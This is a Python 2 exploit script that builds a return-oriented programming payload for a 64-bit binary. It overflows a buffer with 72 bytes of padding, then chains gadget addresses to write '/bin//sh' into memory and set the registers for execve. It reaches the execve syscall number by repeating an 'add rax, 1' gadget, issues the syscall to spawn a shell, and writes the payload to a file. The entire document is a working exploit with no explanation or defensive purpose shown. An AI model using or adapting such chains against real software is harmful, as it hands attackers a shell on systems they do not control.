#!/usr/bin/env python2
from struct import pack


p = 'A'*72
p += pack('<Q', 0x00000000004015e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c9080) # @ .data
p += pack('<Q', 0x0000000000477a36) # pop rax ; pop rdx ; pop rbx ; ret
p += '/bin//sh'
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x00000000004734e1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004015e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c9088) # @ .data + 8
p += pack('<Q', 0x000000000042550f) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004734e1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004014c6) # pop rdi ; ret
p += pack('<Q', 0x00000000006c9080) # @ .data
p += pack('<Q', 0x00000000004015e7) # pop rsi ; ret
p += pack('<Q', 0x00000000006c9088) # @ .data + 8
p += pack('<Q', 0x0000000000441d06) # pop rdx ; ret
p += pack('<Q', 0x00000000006c9088) # @ .data + 8
p += pack('<Q', 0x000000000042550f) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000465b90) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004666d5) # syscall ; ret

f = open("shellcode", "w")
f.write(p)

